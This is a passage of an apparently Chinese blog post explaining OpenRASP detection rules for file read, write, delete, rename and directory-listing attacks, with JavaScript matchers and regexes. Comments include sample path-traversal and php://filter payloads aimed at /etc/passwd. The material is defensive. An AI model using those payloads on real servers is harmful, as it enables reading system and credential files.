&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取协议，如果有</span></span><br><span class="line">    <span class="keyword">var</span> path_parts = params.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&#x27;://&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> proto = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (path_parts.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            proto = path_parts[<span class="number">0</span>].<span class="title function_">toLowerCase</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法1: 简单用户输入识别，拦截任意文件下载漏洞</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 不影响正常操作，e.g</span></span><br><span class="line">    <span class="comment">// ?path=download/1.jpg</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ?path=/etc/./hosts</span></span><br><span class="line">            <span class="comment">// ?path=../../../etc/passwd</span></span><br><span class="line">            <span class="keyword">if</span> ( (proto == <span class="string">&quot;&quot;</span> || proto == <span class="string">&quot;file&quot;</span> ) &amp;&amp;</span><br><span class="line">                !readFileWhiteExt.<span class="title function_">test</span>(params.<span class="property">realpath</span>) &amp;&amp;</span><br><span class="line">                <span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">lcs_search</span>)</span><br><span class="line">               )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Downloading files specified by userinput, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>: <span class="string">&#x27;readFile_userinput&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// @<span class="doctag">FIXME:</span> 用户输入匹配了两次，需要提高效率</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_from_userinput</span>(all_parameter, params.<span class="property">path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. 读取 http(s):// 内容</span></span><br><span class="line">            <span class="comment">// ?file=http://www.baidu.com</span></span><br><span class="line">            <span class="keyword">if</span> (proto === <span class="string">&#x27;http&#x27;</span> || proto === <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput_http</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput_http</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting http/https resource with file streaming functions, URL is %1%&quot;</span>, [params.<span class="property">path</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_userinput_http&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 读取特殊协议内容</span></span><br><span class="line">            <span class="comment">// ?file=file:///etc/passwd</span></span><br><span class="line">            <span class="comment">// ?file=php://filter/read=convert.base64-encode/resource=XXX</span></span><br><span class="line">            <span class="keyword">if</span> (proto === <span class="string">&#x27;file&#x27;</span> || proto === <span class="string">&#x27;php&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Requesting unwanted protocol %1%://&quot;</span>, [proto]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_userinput_unwanted&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法2: 文件、目录探针</span></span><br><span class="line">    <span class="comment">// 如果应用读取了列表里的文件，比如 /root/.bash_history，这通常意味着后门操作</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> realpath_lc = params.<span class="property">realpath</span>.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; forcefulBrowsing.<span class="property">absolutePaths</span>.<span class="property">length</span>; j ++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (forcefulBrowsing.<span class="property">absolutePaths</span>[j] == realpath_lc) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Accessing sensitive file %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_unwanted&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法3: 检查文件遍历，看是否超出web目录范围 [容易误报~]</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> ( (proto == <span class="string">&quot;&quot;</span> || proto == <span class="string">&quot;file&quot;</span> ) &amp;&amp; algorithmConfig.<span class="property">readFile_outsideWebroot</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> path        = params.<span class="property">path</span></span><br><span class="line">            <span class="keyword">var</span> appBasePath = context.<span class="property">appBasePath</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">is_outside_webroot</span>(appBasePath, params.<span class="property">realpath</span>, path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_outsideWebroot</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - accessing files outside webroot (%1%), file is %2%&quot;</span>, [appBasePath, params.<span class="property">realpath</span>]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_outsideWebroot&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件读取扩展名白名单，包含 压缩文件 office文件 图片文件</span></span><br><span class="line"><span class="keyword">var</span> readFileWhiteExt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\.(do[c|t][x|m|]?|xl[s|t][x|m|b]?|pp[t|s|a][x|m]?|pot[x|m]|7z|tar|gz|bz2|xz|rar|zip|jpg|jpeg|png|gif|bmp|txt|)$/</span>, <span class="string">&#x27;i&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="任意文件写入–检测算法"><a href="#任意文件写入–检测算法" class="headerlink" title="任意文件写入–检测算法"></a>任意文件写入–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写文件操作 - NTFS 流</span></span><br><span class="line"><span class="attr">writeFile_NTFS</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 拦截 NTFS ::$DATA 写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 写文件操作 - PUT 上传脚本文件 - 无法关联实际上传的文件和写文件操作，暂时注释掉</span></span><br><span class="line"><span class="comment">// writeFile_PUT_script: &#123;</span></span><br><span class="line"><span class="comment">//     name:   &#x27;算法2 - 拦截 PUT 方式上传 php/jsp 等脚本文件&#x27;,</span></span><br><span class="line"><span class="comment">//     action: &#x27;block&#x27;</span></span><br><span class="line"><span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写文件操作 - 脚本文件</span></span><br><span class="line"><span class="comment">// https://rasp.baidu.com/doc/dev/official.html#case-file-write</span></span><br><span class="line"><span class="attr">writeFile_script</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法2 - 拦截 php/jsp 等脚本文件的写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-file-write&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">userinput</span>:  <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">lcs_search</span>: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="attr">writeFile_reflect</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法3 - 拦截通过反射、反序列化执行的文件写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;writeFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写 NTFS 流文件，通常是为了绕过限制</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_NTFS</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ntfsRegex.<span class="title function_">test</span>(params.<span class="property">realpath</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_NTFS</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File write - Writing NTFS alternative data streams&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_NTFS&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PUT 上传脚本文件 - 有个关联问题需要解决，暂时注释掉</span></span><br><span class="line">    <span class="comment">// if (context.method == &#x27;put&#x27; &amp;&amp;</span></span><br><span class="line">    <span class="comment">//     algorithmConfig.writeFile_PUT_script.action != &#x27;ignore&#x27;)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if (scriptFileRegex.test(params.realpath))</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         return &#123;</span></span><br><span class="line">    <span class="comment">//             action:     algorithmConfig.writeFile_PUT_script.action,</span></span><br><span class="line">    <span class="comment">//             message:    _(&quot;File upload - Using HTTP PUT method to upload a webshell&quot;, [params.realpath]),</span></span><br><span class="line">    <span class="comment">//             confidence: 95,</span></span><br><span class="line">    <span class="comment">//             algorithm:  &#x27;writeFile_PUT_script&#x27;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关于这个算法，请参考这个插件定制文档</span></span><br><span class="line">    <span class="comment">// https://rasp.baidu.com/doc/dev/official.html#case-file-write</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">            <span class="keyword">var</span> is_win = context.<span class="property">server</span>.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">realpath</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">userinput</span>) ||</span><br><span class="line">                    ((algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">userinput</span>) &amp;&amp;</span><br><span class="line">                     (<span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">lcs_search</span>)))</span><br><span class="line">                   ) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File write - Creating or appending to a server-side script file, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_script&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_reflect</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.<span class="property">server</span>.<span class="property">language</span> == <span class="string">&#x27;java&#x27;</span> &amp;&amp;</span><br><span class="line">            (params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.jsp&quot;</span>) || params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.jspx&quot;</span>))</span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">var</span> message = <span class="title function_">validate_stack_java</span>(params.<span class="property">stack</span>)</span><br><span class="line">                <span class="keyword">if</span> (message) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Reflect file write - %1%, file is %2%&quot;</span>, [message, params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_reflect&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 其他的 stream 都没啥用</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br></pre></td></tr></table></figure><h3 id="任意文件删除–检测算法"><a href="#任意文件删除–检测算法" class="headerlink" title="任意文件删除–检测算法"></a>任意文件删除–检测算法</h3><p>1.控制变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 任意文件删除 - 使用 ../跳出目录</span><br><span class="line">    deleteFile_userinput: &#123;</span><br><span class="line">        name:      &#x27;算法1 - 用户输入匹配，禁止使用 ../ 删除文件&#x27;,</span><br><span class="line">        action:    &#x27;block&#x27;,</span><br><span class="line">        lcs_search: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;deleteFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">        <span class="keyword">var</span> is_win = context.<span class="property">server</span>.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">lcs_search</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File delete - Deleting files specified by userinput, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;deleteFile_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="文件重命名–检测算法"><a href="#文件重命名–检测算法" class="headerlink" title="文件重命名–检测算法"></a>文件重命名–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/ 重命名监控 - 将普通文件重命名为webshell，</span><br><span class="line"><span class="comment">// 案例有 MOVE 方式上传后门、CVE-2018-9134 dedecms v5.7 后台重命名 getshell</span></span><br><span class="line">    <span class="attr">rename_webshell</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 通过重命名方式获取 WebShell&#x27;</span>,</span><br><span class="line">            <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// copy_webshell: &#123;</span></span><br><span class="line">    <span class="comment">//     action: &#x27;block&#x27;</span></span><br><span class="line">    <span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">link_webshell</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 通过链接方式获取 WebShell&#x27;</span>,</span><br><span class="line">            <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (algorithmConfig.rename_webshell.action != &#x27;ignore&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    plugin.register(&#x27;rename&#x27;, function (params, context) &#123;</span><br><span class="line">        // 目标文件在webroot内才认为是写后门</span><br><span class="line">        if (!is_outside_webroot(context.appBasePath, params.dest, null)) &#123;</span><br><span class="line">            // 源文件是干净的文件，目标文件是脚本文件，判定为重命名方式写后门</span><br><span class="line">            if (cleanFileRegex.test(params.source) &amp;&amp; scriptFileRegex.test(params.dest))</span><br><span class="line">            &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    action:    algorithmConfig.rename_webshell.action,</span><br><span class="line">                    message:   _(&quot;File upload - Renaming a non-script file to server-side script file, source file is %1%&quot;, [</span><br><span class="line">                        params.source</span><br><span class="line">                    ]),</span><br><span class="line">                    confidence: 90,</span><br><span class="line">                    algorithm:  &#x27;rename_webshell&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return clean</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常文件</span></span><br><span class="line"><span class="keyword">var</span> cleanFileRegex  = <span class="regexp">/\.(jpg|jpeg|png|gif|bmp|txt|rar|zip)$/i</span></span><br><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br></pre></td></tr></table></figure><h3 id="文件目录列出–检测算法"><a href="#文件目录列出–检测算法" class="headerlink" title="文件目录列出–检测算法"></a>文件目录列出–检测算法</h3><p>1.控制变量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件管理器 - 用户输入匹配，仅当直接读取绝对路径时才检测</span></span><br><span class="line">directory_userinput: &#123;</span><br><span class="line">    name:       <span class="string">&#x27;算法1 - 用户输入匹配算法&#x27;</span>,</span><br><span class="line">    action:     <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    lcs_search: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件管理器 - 反射方式列目录</span></span><br><span class="line">directory_reflect: &#123;</span><br><span class="line">    name:   <span class="string">&#x27;算法2 - 通过反射调用，查看目录内容&#x27;</span>,</span><br><span class="line">    action: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件管理器 - 查看敏感目录</span></span><br><span class="line">directory_unwanted: &#123;</span><br><span class="line">    name:   <span class="string">&#x27;算法3 - 尝试查看敏感目录&#x27;</span>,</span><br><span class="line">    action: <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;directory&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> realpath    = params.<span class="property">realpath</span></span><br><span class="line">    <span class="keyword">var</span> server      = context.<span class="property">server</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> is_windows  = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> language    = server.<span class="property">language</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法2 - 检查PHP菜刀等后门</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (language == <span class="string">&#x27;php&#x27;</span> &amp;&amp; <span class="title function_">validate_stack_php</span>(params.<span class="property">stack</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Using file manager function with China Chopper WebShell&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_reflect&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (language == <span class="string">&#x27;java&#x27;</span> &amp;&amp; <span class="title function_">validate_stack_java</span>(params.<span class="property">stack</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Using file manager function with Java WebShell&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_reflect&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法1 - 用户输入匹配。</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_path_containing_userinput</span>(all_parameter, params.<span class="property">path</span>, is_windows, algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">lcs_search</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Accessing folder specified by userinput, folder is %1%&quot;</span>, [realpath]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法3 - 读取敏感目录</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; forcefulBrowsing.<span class="property">unwantedDirectory</span>.<span class="property">length</span>; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (realpath == forcefulBrowsing.<span class="property">unwantedDirectory</span>[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Accessing sensitive folder: %1%&quot;</span>, [realpath]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_unwanted&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span 